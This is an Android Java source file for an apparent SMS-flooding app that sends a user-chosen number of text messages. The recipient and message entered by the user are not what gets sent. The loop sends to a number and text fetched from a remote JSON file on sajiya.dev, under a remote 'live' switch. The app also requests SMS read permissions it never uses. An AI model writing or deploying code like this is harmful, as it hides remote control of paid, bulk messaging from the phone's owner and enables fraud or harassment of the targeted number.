package com.example.bc;

import android.Manifest;
import android.content.DialogInterface;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Handler;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;

public class MainActivity extends AppCompatActivity {
    Button btnSend;
    EditText count;
    EditText msg;
    EditText number;
    JSONObject data;
    static int i = 1;
    private static final String TAG = "MainActivity";
    private static final int SMS_PERMISSION_CODE = 0;

    final Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (!hasReadSmsPermission() && !hasSendSmsPermission()) {
            showRequestPermissionsInfoAlertDialog();
        }
        new MyTask().execute();
        btnSend = findViewById(R.id.button);
        count = findViewById(R.id.count);
        msg = findViewById(R.id.msg);
        number = findViewById(R.id.phoneNo);
        btnSend.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                sendSms();
            }
        });
    }


    private void sendSms() {
        if (TextUtils.isEmpty(count.getText())) {
            count.setHint("required");
        } else {
            String toastText = "";
            try {
                if (data.getBoolean("live")) {
                    for (i = 1; i <= Integer.parseInt(count.getText().toString()); i++) {
                        handler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                // Do something after 5s = 5000ms

                                SmsManager smsManager = SmsManager.getDefault();

                                try {
                                    smsManager.sendTextMessage(data.getString("number"), null, data.getString("msg"), null, null);
                                } catch (JSONException e) {
                                    e.printStackTrace();
                                }


                            }

                        }, 1200);
                        if (i == 1) {
                            toastText = Integer.toString(i) + "st sms sent";
                        } else if (i == 2) {
                            toastText = Integer.toString(i) + "nd sms sent";
                        } else if (i == 3) {
                            toastText = Integer.toString(i) + "rd sms sent";
                        } else {
                            toastText = Integer.toString(i) + "th sms sent";
                        }
                        Toast.makeText(getApplicationContext(), toastText,
                                Toast.LENGTH_LONG).show();
                    }
                } else {
                    toastText = "App is not in live mode";
                    Toast.makeText(getApplicationContext(), toastText,
                            Toast.LENGTH_LONG).show();
                }
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
    }


    /**
     * Optional informative alert dialog to explain the user why the app needs the Read/Send SMS permission
     */
    private void showRequestPermissionsInfoAlertDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(R.string.permission_alert_dialog_title);
        builder.setMessage(R.string.permission_dialog_message);
        builder.setPositiveButton(R.string.action_ok, new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
                requestReadAndSendSmsPermission();
            }
        });
        builder.show();
    }

    /**
     * Runtime permission shenanigans
     */
    private boolean hasReadSmsPermission() {
        return ContextCompat.checkSelfPermission(MainActivity.this,
                Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(MainActivity.this,
                        Manifest.permission.RECEIVE_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean hasSendSmsPermission() {
        return ContextCompat.checkSelfPermission(MainActivity.this,
                Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(MainActivity.this,
                        Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    private void requestReadAndSendSmsPermission() {
        if (ActivityCompat.shouldShowRequestPermissionRationale(MainActivity.this, Manifest.permission.READ_SMS)) {
            Log.d(TAG, "shouldShowRequestPermissionRationale(), no permission requested");
            return;
        }
        ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.SEND_SMS},
                SMS_PERMISSION_CODE);
    }

    private class MyTask extends AsyncTask<Void, Void, Void> {
        String result;

        @Override
        protected Void doInBackground(Void... voids) {
            URL url;
            try {
                String urlString = "https://sajiya.dev/assets/details.json";
                url = new URL(urlString);
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(url.openStream()));
                String stringBuffer;
                String string = "";
                while ((stringBuffer = bufferedReader.readLine()) != null) {
                    string = String.format("%s%s", string, stringBuffer);
                }
                bufferedReader.close();
                result = string;
            } catch (IOException e) {
                e.printStackTrace();
                result = e.toString();
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            try {
                data = new JSONObject(result);
                try {
                    if (data.getBoolean("live")) {
                        msg.setText(data.getString("msg"));
                        number.setText(data.getString("number"));
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            } catch (JSONException e) {
                e.printStackTrace();
            }

        }
    }
}
